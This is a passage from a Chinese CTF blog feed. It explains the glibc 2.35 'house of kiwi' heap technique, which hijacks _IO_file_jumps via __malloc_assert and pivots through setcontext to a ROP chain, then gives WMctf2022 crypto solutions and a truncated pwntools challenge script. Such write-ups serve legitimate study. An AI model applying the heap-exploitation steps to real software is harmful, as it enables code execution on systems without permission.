endbr64</span><br><span class="line">0x00007fa70ef04a34 &lt;+4&gt;:     push   rdi</span><br><span class="line">0x00007fa70ef04a35 &lt;+5&gt;:     lea    rsi,[rdi+0x128]</span><br><span class="line">0x00007fa70ef04a3c &lt;+12&gt;:    xor    edx,edx</span><br><span class="line">0x00007fa70ef04a3e &lt;+14&gt;:    mov    edi,0x2</span><br><span class="line">0x00007fa70ef04a43 &lt;+19&gt;:    mov    r10d,0x8</span><br><span class="line">0x00007fa70ef04a49 &lt;+25&gt;:    mov    eax,0xe</span><br><span class="line">0x00007fa70ef04a4e &lt;+30&gt;:    syscall</span><br><span class="line">0x00007fa70ef04a50 &lt;+32&gt;:    pop    rdx</span><br><span class="line">0x00007fa70ef04a51 &lt;+33&gt;:    cmp    rax,0xfffffffffffff001</span><br><span class="line">0x00007fa70ef04a57 &lt;+39&gt;:    jae    0x7fa70ef04b7f &lt;setcontext+335&gt;</span><br><span class="line">0x00007fa70ef04a5d &lt;+45&gt;:    mov    rcx,QWORD PTR [rdx+0xe0]</span><br><span class="line">0x00007fa70ef04a64 &lt;+52&gt;:    fldenv [rcx]</span><br><span class="line">0x00007fa70ef04a66 &lt;+54&gt;:    ldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;</span><br><span class="line">0x00007fa70ef04aa1 &lt;+113&gt;:   mov    rsi,QWORD PTR [rdx+0x3a8]</span><br><span class="line">0x00007fa70ef04aa8 &lt;+120&gt;:   mov    rdi,rsi</span><br><span class="line">0x00007fa70ef04aab &lt;+123&gt;:   mov    rcx,QWORD PTR [rdx+0x3b0]</span><br><span class="line">0x00007fa70ef04ab2 &lt;+130&gt;:   cmp    rcx,QWORD PTR fs:0x78</span><br><span class="line">0x00007fa70ef04abb &lt;+139&gt;:   je     0x7fa70ef04af5 &lt;setcontext+197&gt;</span><br><span class="line">0x00007fa70ef04abd &lt;+141&gt;:   mov    rax,QWORD PTR [rsi-0x8]</span><br><span class="line">0x00007fa70ef04ac1 &lt;+145&gt;:   and    rax,0xfffffffffffffff8</span><br><span class="line">0x00007fa70ef04ac5 &lt;+149&gt;:   cmp    rax,rsi</span><br><span class="line">0x00007fa70ef04ac8 &lt;+152&gt;:   je     0x7fa70ef04ad0 &lt;setcontext+160&gt;</span><br><span class="line">0x00007fa70ef04aca &lt;+154&gt;:   sub    rsi,0x8</span><br><span class="line">0x00007fa70ef04ace &lt;+158&gt;:   jmp    0x7fa70ef04abd &lt;setcontext+141&gt;</span><br><span class="line">0x00007fa70ef04ad0 &lt;+160&gt;:   mov    rax,0x1</span><br><span class="line">0x00007fa70ef04ad7 &lt;+167&gt;:   incsspq rax</span><br><span class="line">0x00007fa70ef04adc &lt;+172&gt;:   rstorssp QWORD PTR [rsi-0x8]</span><br><span class="line">0x00007fa70ef04ae1 &lt;+177&gt;:   saveprevssp</span><br><span class="line">0x00007fa70ef04ae5 &lt;+181&gt;:   mov    rax,QWORD PTR [rdx+0x3b0]</span><br><span class="line">0x00007fa70ef04aec &lt;+188&gt;:   mov    QWORD PTR fs:0x78,rax</span><br><span class="line">0x00007fa70ef04af5 &lt;+197&gt;:   rdsspq rcx</span><br><span class="line">0x00007fa70ef04afa &lt;+202&gt;:   sub    rcx,rdi</span><br><span class="line">0x00007fa70ef04afd &lt;+205&gt;:   je     0x7fa70ef04b1c &lt;setcontext+236&gt;</span><br><span class="line">0x00007fa70ef04aff &lt;+207&gt;:   neg    rcx</span><br><span class="line">0x00007fa70ef04b02 &lt;+210&gt;:   shr    rcx,0x3</span><br><span class="line">0x00007fa70ef04b06 &lt;+214&gt;:   mov    esi,0xff</span><br><span class="line">0x00007fa70ef04b0b &lt;+219&gt;:   cmp    rcx,rsi</span><br><span class="line">0x00007fa70ef04b0e &lt;+222&gt;:   cmovb  rsi,rcx</span><br><span class="line">0x00007fa70ef04b12 &lt;+226&gt;:   incsspq rsi</span><br><span class="line">0x00007fa70ef04b17 &lt;+231&gt;:   sub    rcx,rsi</span><br><span class="line">0x00007fa70ef04b1a &lt;+234&gt;:   ja     0x7fa70ef04b0b &lt;setcontext+219&gt;</span><br><span class="line">0x00007fa70ef04b1c &lt;+236&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b20 &lt;+240&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b24 &lt;+244&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b2b &lt;+251&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b2f &lt;+255&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b33 &lt;+259&gt;:   mov    r10,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b3a &lt;+266&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b41 &lt;+273&gt;:   rdsspq rax</span><br><span class="line">0x00007fa70ef04b46 &lt;+278&gt;:   cmp    r10,QWORD PTR [rax]</span><br><span class="line">0x00007fa70ef04b49 &lt;+281&gt;:   mov    eax,0x0</span><br><span class="line">0x00007fa70ef04b4e &lt;+286&gt;:   jne    0x7fa70ef04b53 &lt;setcontext+291&gt;</span><br><span class="line">0x00007fa70ef04b50 &lt;+288&gt;:   push   r10</span><br><span class="line">0x00007fa70ef04b52 &lt;+290&gt;:   ret</span><br><span class="line">0x00007fa70ef04b53 &lt;+291&gt;:   jmp    r10</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret</span><br><span class="line">0x00007fa70ef04b7f &lt;+335&gt;:   mov    rcx,QWORD PTR [rip+0x1c528a]        # 0x7fa70f0c9e10</span><br><span class="line">0x00007fa70ef04b86 &lt;+342&gt;:   neg    eax</span><br><span class="line">0x00007fa70ef04b88 &lt;+344&gt;:   mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">0x00007fa70ef04b8b &lt;+347&gt;:   or     rax,0xffffffffffffffff</span><br><span class="line">0x00007fa70ef04b8f &lt;+351&gt;:   ret</span><br></pre></td></tr></table></figure><p>(地址先不管它，应该每次都会变)</p><p>这里我们看的是<code>glibc-2.35</code>下的，而<code>glibc2.29</code>及以前的这段代码不太一样，那个版本我们关注的重点是<code>rdi</code>寄存器，而这个版本很明显我们要对各个寄存器赋值的话其实是需要控制<code>rdx</code>寄存器的。</p><p>我们关注的主要是从<code>&lt;+61&gt;</code>这段代码开始的，精简一下就是如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个判断跳转大概是每次都能跳转到<code>&lt;setcontext+294&gt;</code>(希腊奶，没调试过)。通过这个我们可以发现，如果我们控制<code>rdx</code>为可控地址，然后控制<code>rdx+0xa0</code>和<code>rdx+0xa8</code>地址的值，这样我们就能控制<code>rsp</code>寄存器，以及程序流(因为在<code>&lt;+294&gt;</code>这里把<code>[rdx+0xa8]</code>的值赋给了<code>rcx</code>然后压栈，所以之后<code>ret</code>的时候实际上弹给<code>rip</code>寄存器的就是<code>[rdx+0xa8]</code>的值，也即控制了程序流)</p><p>那么我们就有控制栈，以及控制程序流的能力了。这里我们可以这样操作，控制<code>rsp</code>指向<code>orw</code>链，然后控制<code>rcx</code>指向<code>ret</code>，这样我们最后<code>&lt;+334&gt;</code>执行完<code>ret</code>的时候实际上下一条指令还是<code>ret</code>，但是<code>rsp</code>已经指向了<code>orw</code>链，然后下一条<code>ret</code>就然我们进入了<code>orw</code>阶段</p><p>不过话又说回来，要控制<code>rdx</code>寄存器的话我们还是需要借助一点<code>gadget</code>，这个积累一下或者用<code>ROPgadget</code>搜一下就行了，或者当进入某些想利用的函数的时候<code>rdx</code>寄存器刚好是我们能利用的地址附近也可以直接用</p><h2 id="house-of-kiwi利用思路"><a href="#house-of-kiwi利用思路" class="headerlink" title="house of kiwi利用思路"></a>house of kiwi利用思路</h2><p><code>house of kiwi</code>实际上解决的是当程序中无<code>exit</code>等函数来触发<code>IO</code>流的时候来触发<code>IO</code>然后进行<code>orw</code></p><p>，主要是借助以下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">       <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数实际上并不是第一次遇到，在<code>house of orange</code>中我们也遇到过，不过那时候是为了绕过它，而这里我们是想办法触发它。</p><p>为什么想要调用它呢，因为注意到有个<code>fflush(stderr);</code>其中会调用<code>_IO_file_jumps</code>中的<code>sync</code>指针，如果能修改它就能进行劫持。</p><p>那么问题是如何调用，这个事实上了解过<code>house of orange</code>的都应该有了解，主要是这个判断。当<code>top_chunk</code>大小不够分配的时候，会进入<code>sysmalloc</code>，其中有对旧的<code>top_chunk</code>也就是大小不够的那个原来的<code>top_chunk</code>进行检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>主要是以下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_size &gt;&#x3D;MINSIZE</span><br><span class="line">old_top.pre_inuse &#x3D; 0</span><br><span class="line">old_top页对齐</span><br></pre></td></tr></table></figure><p>事实上我们只要修改<code>top_chunk</code>的<code>size</code>使其不对齐，就能调用<code>__malloc_assert</code>了</p><p>下面我们看看调用的时候各个寄存器的情况</p><p><img src="https://s2.loli.net/2022/09/15/IM7CoDuV895E3Be.png" alt=""></p><p>这里<code>rbp</code>是<code>_IO_file_jumps</code>,多次调试可以发现<code>rdx</code>每次都是<code>IO_helper_jumps</code>，是个固定的地址</p><p>所以我们如果能修改<code>_IO_file_jumps+0x60</code>为<code>&lt;setcontext+61&gt;</code>，然后根据之前对<code>setcontext</code>的分析，将<code>rdx+0xa0</code>以及<code>rdx+0xa8</code>也就是<code>IO_helper_jumps+0xa0</code>和<code>IO_helper_jumps+0xa8</code>分别修改为存有<code>orw</code>或其他<code>ROP</code>链的地址和<code>ret</code>地址，这样就能栈迁移来<code>orw</code>或者直接getshell(如果沙盒允许的话)</p><h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;crypto卷不动了，来学一下pwn (x)&lt;/p&gt;
&lt;h1 id=&quot;FSOP&quot;&gt;&lt;a href=&quot;#FSOP&quot; class=&quot;headerlink&quot; title=&quot;FSOP&quot;&gt;&lt;/a&gt;FSOP&lt;/h1&gt;&lt;p&gt;FSOP即&lt;code&gt;File Stream Oriented </summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://phot0n.com/tags/heap/"/>
    
    <category term="IO_FILE" scheme="http://phot0n.com/tags/IO-FILE/"/>
    
    <category term="FSOP" scheme="http://phot0n.com/tags/FSOP/"/>
    
  </entry>
  
  <entry>
    <title>WMctf2022</title>
    <link href="http://phot0n.com/2022/08/31/WMctf2022/"/>
    <id>http://phot0n.com/2022/08/31/WMctf2022/</id>
    <published>2022-08-31T03:06:45.000Z</published>
    <updated>2022-09-07T03:10:42.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h2><p>通过计算可得知<script type="math/tex">((x_3-x_1)^3*4y_1^2+(3x_1^2*(x_3-x_1)+y_3^2-y_1^2-(x_3^3-x_1^3))^2)*(x1-x_3)^2-(y_3+y_1)^2*4y_1^2 = 0 \mod p</script></p><p>然后通过求gcd分解n，得到明文m之后发现似乎并不是flag，第一个为不可见字符。左思右想良久之后发现m的比特位只有200出头，而output说flag有606比特，然后突然想起来还有椭圆曲线的a和b没用到，发现a和b的比特位刚好也是200出头，加起来正好606.由于比特字符8位一分组，所以从1-8简单的爆破了一下偏移，发现了a和b中有可打印字符，拼接起来就行</p><h2 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h2><p>先把所有的$p_i$求出来,构造如下格子</p><script type="math/tex; mode=display">\begin{pmatrix}2^{191} & pk_1 & pk_2& \cdots & pk_{n-1}&pk_n\\0 & -pk_0 & 0 & \cdots & 0 &0\\\vdots & \vdots & \ddots & \vdots \\0 & 0 & \dots & -pk_0  &0 &0 \\0&0&\dots& 0&-pk_0 &0\\0&0&\dots &0&0&-pk_0 \end{pmatrix}</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pk=[]</span><br><span class="line">n = len(pk)</span><br><span class="line">print(n)</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ,n,n)</span><br><span class="line">M[<span class="number">0</span>,<span class="number">0</span>] = <span class="number">2</span>**<span class="number">191</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">    M[i,i] = -pk[<span class="number">0</span>]</span><br><span class="line">    M[<span class="number">0</span>,i] = pk[i]</span><br><span class="line">output = open(<span class="string">&quot;file.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">M = M.LLL()</span><br><span class="line">print(M,file=output)</span><br><span class="line">print(M[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>由于$p_i<em>pk_0-p_0</em>pk_i = 2<em>(r_0</em>p_i-r_i<em>p_0)$ 整理得$r_0</em>p_i-r_i*p_0 = tmp_i$ 然后构造如下矩阵，求出$r_i$</p><script type="math/tex; mode=display">\left(    \begin{array}{c}      r_0,r_1,\dots r_{n-1},r_n,1    \end{array}\right)\begin{pmatrix}p_1 *2^{300}& p_2*2^{300} & p_3*2^{300}& \cdots & 0&0\\-p_0*2^{300} & 0 & 0 & \cdots & 0 &0\\\vdots & \vdots & \ddots & \vdots \\0 & 0 & \dots & 0 &0 &0 \\0&0&\dots& -p_0*2^{300}&1 &0\\-tmp_1*2^{300}&-tmp_2*2^{300}&\dots &-tmp_n*2^{300}&0&2^{191}\end{pmatrix} = \left(    \begin{array}{c}      0,0,\dots,0,r_n,2^{191}    \end{array}\right)</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">q=[]</span><br><span class="line">x=[]<span class="comment">#数据省略</span></span><br><span class="line">n = <span class="number">500</span></span><br><span class="line">M = matrix(ZZ,n,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-2</span>):</span><br><span class="line">    tmp_i = q[i+<span class="number">1</span>]*x[<span class="number">0</span>]-q[<span class="number">0</span>]*x[i+<span class="number">1</span>]</span><br><span class="line">    tmp_i = tmp_i//<span class="number">2</span></span><br><span class="line">    M[<span class="number">0</span>,i] = q[i+<span class="number">1</span>]*<span class="number">2</span>**<span class="number">300</span></span><br><span class="line">    M[i+<span class="number">1</span>,i] = -q[<span class="number">0</span>]*<span class="number">2</span>**<span class="number">300</span></span><br><span class="line">    M[n<span class="number">-1</span>,i] = -tmp_i*<span class="number">2</span>**<span class="number">300</span></span><br><span class="line">M[n<span class="number">-2</span>,n<span class="number">-2</span>] = <span class="number">1</span></span><br><span class="line">M[n<span class="number">-1</span>,n<span class="number">-1</span>] = <span class="number">2</span>**<span class="number">191</span></span><br><span class="line"><span class="comment">#matrix_overview(M)</span></span><br><span class="line">output = open(<span class="string">&quot;r.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">print(<span class="string">&#x27;start LLL&#x27;</span>)</span><br><span class="line">G = M.LLL()</span><br><span class="line">print(<span class="string">&#x27;LLL over&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;start inverse&quot;</span>)</span><br><span class="line">MT = M.inverse()</span><br><span class="line">print(<span class="string">&quot;inverse over&quot;</span>)</span><br><span class="line">ans = G[<span class="number">1</span>]</span><br><span class="line">print(ans*MT)</span><br><span class="line">print(M,file=output)</span><br></pre></td></tr></table></figure><p>然后求得$sk$，解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = [] <span class="comment">#数据省略</span></span><br><span class="line">sk=<span class="number">41565572874253689464437825525802665878958533473562648432875965578230785556539072257838190060392315994424904212374664222250474284551725096002854097371874119</span></span><br><span class="line">flag_list = [(i%sk)%<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_list:</span><br><span class="line">    flag+=str(i)</span><br><span class="line">print(long_to_bytes(int(flag,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><p>不过事后发现，似乎并不一定要原本的$sk$才能解密(事实上这样求出来的$sk,r_i$也应该不是原本的，都并非素数)，可以直接用二元coppersmith，先求出$sk$的近似$sk_0$，然后得到$pk_0=p_0(sk_0+x)+2*y$ 利用small_roots梭出来的也能用来解密flag</p><p>好像直接除就能解密???不太懂…</p><h2 id="nanoDiamod"><a href="#nanoDiamod" class="headerlink" title="nanoDiamod"></a>nanoDiamod</h2><p>很朴素的想法，前面12轮查询如果出现了两次不同，那最后2轮一定是返回正确的结果(如果恰好错误都落在对同一个变量的查询上就寄)</p><p>其他情况就当给的都是正确的</p><p>有时候，知道的太多反而不好.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256 </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line">io = remote(<span class="string">&quot;1.13.154.182&quot;</span>,<span class="number">31778</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = io.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = io.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendline(proof.encode()) </span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">ROUND_NUM = <span class="number">50</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Can you get all the treasure without losing your head?&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ROUND_NUM):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Be careful, Skeleton Merchant can lie twice!&quot;</span>)</span><br><span class="line">    print(<span class="string">f&#x27;round = <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">f&#x27;B<span class="subst">&#123;j&#125;</span> == 1&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">        tmp = io.recvline().strip()[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span>(eval(tmp)):</span><br><span class="line">            ans.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans.append(<span class="number">0</span>)</span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    idx = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> 